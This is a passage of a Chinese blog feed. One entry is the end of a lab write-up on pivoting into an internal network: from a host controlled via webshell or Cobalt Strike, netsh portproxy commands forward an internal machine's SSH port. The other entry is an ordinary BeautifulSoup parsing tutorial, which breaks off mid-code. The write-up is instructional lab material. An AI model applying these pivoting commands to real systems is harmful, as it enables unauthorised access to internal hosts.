href="#实验场景-4" class="headerlink" title="实验场景"></a>实验场景</h3><p>现在有如下的网络，电脑A是攻击机器，可以直接访问电脑B,但是访问不了机器C,可以借助B机器上的 netsh命令进行端口转发访问机器C，这里注意只能访问端口</p><p><img src="/img/image-20231031111910620.png" alt="image-20231031111910620"> </p><h3 id="实验环境-3"><a href="#实验环境-3" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机器A（win11）：121.248.50.50</p><p>官网机器B（windows7 内网）：10.210.100.147&#x2F;192.168.144.130</p><p><img src="/img/image-20231031112343976.png" alt="image-20231031112343976"> </p><p>内网机器C（centos7 内网）：192.168.144.128</p><h3 id="实验复现-4"><a href="#实验复现-4" class="headerlink" title="实验复现"></a>实验复现</h3><p>1、我们通过webshell或者CS远控对方电脑</p><p><img src="/img/image-20231031114123329.png" alt="image-20231031114123329"> </p><p>2、通过远控攻击在B上执行如下的命令（只有管理员才能执行）</p><p>将C机器的22端口转发到B机器上的9999端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=10.210.100.147 <span class="hljs-attribute">listenport</span>=9999 <span class="hljs-attribute">connectport</span>=22 <span class="hljs-attribute">connectaddress</span>=192.168.144.128<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031115006706.png" alt="image-20231031115006706"></p><p>3、查看是否开启转发</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">v4tov4</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031115149044.png" alt="image-20231031115149044"> </p><p>4、在攻击机器A上运行连接靶机C的端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.210.100.147</span> -p <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031115128464.png" alt="image-20231031115128464"></p><p>5、删除转发如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenaddress</span>=10.210.100.147 <span class="hljs-attribute">listenport</span>=9999<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网隧道技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>beautifulsoup学习</title>
    <link href="/2023/11/27/beautifulsoup%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/11/27/beautifulsoup%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="beautiful-soup"><a href="#beautiful-soup" class="headerlink" title="beautiful soup"></a>beautiful soup</h1><h2 id="安装与介绍"><a href="#安装与介绍" class="headerlink" title="安装与介绍"></a>安装与介绍</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> bs4<br></code></pre></td></tr></table></figure><p>用于解析html and xml文档<br>解析器：html.parser、lxml解析器和XML的内置解析器<br>文档遍历：跟xpath差不多，也是整理成树形结构<br>搜索：find（） find_all()<br>修改：增删改查bs4都支持<br>提取数据<br>处理特殊字符</p><p>解析器：<br>html.parser（内置）<br>lxml 速度比较快<br>xml  速度比较快<br>html5lib 用的比较少   速度慢</p><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#导入bs库</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-comment">#创建一个bs对象，用于解析html文档</span><br>soup = BeautifulSoup(<span class="hljs-string">&#x27;&lt;p&gt;hello&lt;/p&gt;&#x27;</span>,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.p.string)<br><br><span class="hljs-comment">#输出：</span><br>hello<br><br><span class="hljs-comment">#导入bs库</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span><br><span class="hljs-string">and they lived at the bottom of a well.&lt;/p&gt;</span><br><span class="hljs-string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#使用prettify()</span><br><span class="hljs-built_in">print</span>(soup.prettify())<br><br><span class="hljs-comment">#结果  bs的解析格式</span><br>&lt;html&gt;<br> &lt;head&gt;<br>  &lt;title&gt;<br>   The Dormouse<span class="hljs-string">&#x27;s story</span><br><span class="hljs-string">  &lt;/title&gt;</span><br><span class="hljs-string"> &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">  &lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;</span><br><span class="hljs-string">   &lt;b&gt;</span><br><span class="hljs-string">    The Dormouse&#x27;</span>s story<br>   &lt;/b&gt;<br>  &lt;/p&gt;<br>  &lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;story&quot;</span>&gt;<br>   Once upon a time there were three little sisters; <span class="hljs-keyword">and</span> their names were<br>   &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;sister&quot;</span> href=<span class="hljs-string">&quot;http://example.com/elsie&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;link1&quot;</span>&gt;<br>    &lt;!-- Elsie --&gt;<br>   &lt;/a&gt;<br>   ,<br>   &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;sister&quot;</span> href=<span class="hljs-string">&quot;http://example.com/lacie&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;link2&quot;</span>&gt;<br>    Lacie<br>   &lt;/a&gt;<br>   <span class="hljs-keyword">and</span><br>   &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;sister&quot;</span> href=<span class="hljs-string">&quot;http://example.com/tillie&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;link3&quot;</span>&gt;<br>    Tillie<br>   &lt;/a&gt;<br>   ;<br><span class="hljs-keyword">and</span> they lived at the bottom of a well.<br>  &lt;/p&gt;<br>  &lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;story&quot;</span>&gt;<br>   ...<br>  &lt;/p&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="1-节点选择器"><a href="#1-节点选择器" class="headerlink" title="1.节点选择器"></a>1.节点选择器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span><br><span class="hljs-string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span><br><span class="hljs-string">and they lived at the bottom of a well.&lt;/p&gt;</span><br><span class="hljs-string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#选择html中的title标签</span><br><span class="hljs-built_in">print</span>(soup.title)<br><span class="hljs-comment">#打印标签下的文本内容</span><br><span class="hljs-built_in">print</span>(soup.title.string)<br><span class="hljs-comment">#如果有多个标签，使用标签打印该节点的话只打印第一个</span><br><span class="hljs-built_in">print</span>(soup.p)<br><span class="hljs-comment">#标签类型</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(soup.title))<br><span class="hljs-comment">#&lt;class &#x27;bs4.element.Tag&#x27;&gt;</span><br><span class="hljs-comment">#用name属性获取节点的名称</span><br><span class="hljs-built_in">print</span>(soup.title.name)<br><span class="hljs-comment">#获取节点的属性 attrs</span><br><span class="hljs-built_in">print</span>(soup.p.attrs)<br><span class="hljs-built_in">print</span>(soup.p.attrs[<span class="hljs-string">&#x27;name&#x27;</span>])<br><span class="hljs-built_in">print</span>(soup.p[<span class="hljs-string">&#x27;name&#x27;</span>])<br><br><span class="hljs-comment">#结果：</span><br>&lt;title&gt;The Dormouse<span class="hljs-string">&#x27;s story&lt;/title&gt;</span><br><span class="hljs-string">The Dormouse&#x27;</span>s story<br>&lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;title&quot;</span> name=<span class="hljs-string">&quot;dromouse&quot;</span>&gt;&lt;b&gt;The Dormouse<span class="hljs-string">&#x27;s story&lt;/b&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;class &#x27;</span>bs4.element.Tag<span class="hljs-string">&#x27;&gt;</span><br><span class="hljs-string">title</span><br><span class="hljs-string">&#123;&#x27;</span><span class="hljs-keyword">class</span><span class="hljs-string">&#x27;: [&#x27;</span>title<span class="hljs-string">&#x27;], &#x27;</span>name<span class="hljs-string">&#x27;: &#x27;</span>dromouse<span class="hljs-string">&#x27;&#125;</span><br><span class="hljs-string">dromouse</span><br><span class="hljs-string">dromouse</span><br></code></pre></td></tr></table></figure><h3 id="2-tag对象嵌套选择"><a href="#2-tag对象嵌套选择" class="headerlink" title="2.tag对象嵌套选择"></a>2.tag对象嵌套选择</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br><span class="hljs-comment">#打印html文档里面的title标签</span><br><span class="hljs-built_in">print</span>(soup.head.title)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(soup.head.title))<br><span class="hljs-built_in">print</span>(soup.head.title.string)<br><br><span class="hljs-comment">#输出</span><br>&lt;title&gt;The Dormouse<span class="hljs-string">&#x27;s story&lt;/title&gt;</span><br><span class="hljs-string">&lt;class &#x27;</span>bs4.element.Tag<span class="hljs-string">&#x27;&gt;</span><br><span class="hljs-string">The Dormouse&#x27;</span>s story<br></code></pre></td></tr></table></figure><h3 id="3-关联选择"><a href="#3-关联选择" class="headerlink" title="3.关联选择"></a>3.关联选择</h3><p>有时候我们选择的时候不能一步到位，需要先选择某节点，然后选择他的 父节点，子节点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">子节点：<br>soup.p.children<br>子孙节点：<br>soup.p.descendants<br>父节点：<br>soup.a.parent<br>祖先节点：<br>soup.a.parents<br>上一个兄弟节点：<br>soup.a.previous_sibling<br>下一个兄弟节点：<br>soup.a.next_sibling<br>后面所有的兄弟节点：<br>soup.a.next_siblings<br>前面所有的兄弟节点：<br>soup.a.previous_siblings<br></code></pre></td></tr></table></figure><p>父子节点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;</span><br><span class="hljs-string">        &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span><br><span class="hljs-string">    &lt;/head&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;p class=&quot;story&quot;&gt;</span><br><span class="hljs-string">            Once upon a time there were three little sisters; and their names were</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;</span><br><span class="hljs-string">                &lt;span&gt;Elsie&lt;/span&gt;</span><br><span class="hljs-string">            &lt;/a&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;</span><br><span class="hljs-string">            and</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;</span><br><span class="hljs-string">            and they lived at the bottom of a well.</span><br><span class="hljs-string">        &lt;/p&gt;</span><br><span class="hljs-string">        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#输出一个列表，包含p节点的所有子节点,包括文本</span><br><span class="hljs-comment">#print(soup.p.contents)</span><br><span class="hljs-comment">#子节点</span><br><span class="hljs-comment">#print(soup.p.children)</span><br><span class="hljs-comment"># for i,child in enumerate(soup.p.children):</span><br><span class="hljs-comment">#     print(child)</span><br><span class="hljs-comment">#子孙节点</span><br><span class="hljs-comment"># print(soup.p.descendants)</span><br><span class="hljs-comment"># for i,child in enumerate(soup.p.children):</span><br><span class="hljs-comment">#     print(child)</span><br><br><span class="hljs-comment">#父节点</span><br><span class="hljs-comment">#print(soup.a.parent)</span><br><span class="hljs-comment">#祖先节点</span><br><span class="hljs-built_in">print</span>(soup.a.parents)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">enumerate</span>(soup.a.parents)))<br>    <br></code></pre></td></tr></table></figure><p>兄弟节点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;p class=&quot;story&quot;&gt;</span><br><span class="hljs-string">            Once upon a time there were three little sisters; and their names were</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;</span><br><span class="hljs-string">                &lt;span&gt;Elsie&lt;/span&gt;</span><br><span class="hljs-string">            &lt;/a&gt;</span><br><span class="hljs-string">            Hello</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;</span><br><span class="hljs-string">            and</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;</span><br><span class="hljs-string">            and they lived at the bottom of a well.</span><br><span class="hljs-string">        &lt;/p&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#上一个兄弟节点：</span><br><span class="hljs-built_in">print</span>(soup.a.previous_sibling)<br><span class="hljs-comment">#下一个兄弟节点：</span><br><span class="hljs-built_in">print</span>(soup.a.next_sibling)<br><span class="hljs-comment">#后面所有的兄弟节点：</span><br><span class="hljs-built_in">print</span>(soup.a.next_siblings)<br><span class="hljs-comment">#前面所有的兄弟节点：</span><br><span class="hljs-built_in">print</span>(soup.a.previous_siblings)<br><br><span class="hljs-comment">#输出</span><br>            Once upon a time there were three little sisters; <span class="hljs-keyword">and</span> their names were<br><br>            Hello<br><br>&lt;generator <span class="hljs-built_in">object</span> PageElement.next_siblings at <span class="hljs-number">0x000001FE1EBAD270</span>&gt;<br>&lt;generator <span class="hljs-built_in">object</span> PageElement.previous_siblings at <span class="hljs-number">0x000001FE1EBAD270</span>&gt;<br></code></pre></td></tr></table></figure><p>内容与属性的获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;p class=&quot;story&quot;&gt;</span><br><span class="hljs-string">            Once upon a time there were three little sisters; and their names were</span><br><span class="hljs-string">            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Bob&lt;/a&gt;&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/p&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.a.next_sibling.string)<br><br><span class="hljs-built_in">print</span>(soup.a.parents)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(soup.a.parents)[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(soup.a.parents)[<span class="hljs-number">0</span>].attrs[<span class="hljs-string">&#x27;class&#x27;</span>])<br><br><span class="hljs-comment">#结果</span><br>Lacie<br>&lt;generator <span class="hljs-built_in">object</span> PageElement.parents at <span class="hljs-number">0x0000010FD9CAD200</span>&gt;<br>&lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;story&quot;</span>&gt;<br>            Once upon a time there were three little sisters; <span class="hljs-keyword">and</span> their names were<br>            &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;sister&quot;</span> href=<span class="hljs-string">&quot;http://example.com/elsie&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;link1&quot;</span>&gt;Bob&lt;/a&gt;&lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;sister&quot;</span> href=<span class="hljs-string">&quot;http://example.com/lacie&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;link2&quot;</span>&gt;Lacie&lt;/a&gt;<br>&lt;/p&gt;<br>[<span class="hljs-string">&#x27;story&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="4-方法选择器"><a href="#4-方法选择器" class="headerlink" title="4.方法选择器"></a>4.方法选择器</h3><p>find_all,find方法</p><p>find_all方法基本使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&quot;panel&quot;&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-heading&quot;&gt;</span><br><span class="hljs-string">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br><span class="hljs-comment">#查找所有的ul元素</span><br><span class="hljs-built_in">print</span>(soup.find_all(name=<span class="hljs-string">&#x27;ul&#x27;</span>))<br><span class="hljs-built_in">print</span>(soup.find_all(name=<span class="hljs-string">&#x27;ul&#x27;</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(soup.find_all(name=<span class="hljs-string">&#x27;ul&#x27;</span>)[<span class="hljs-number">1</span>]))<br><span class="hljs-comment">#遍历所有的ul</span><br><span class="hljs-keyword">for</span> ul <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&#x27;ul&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(ul.find_all(name=<span 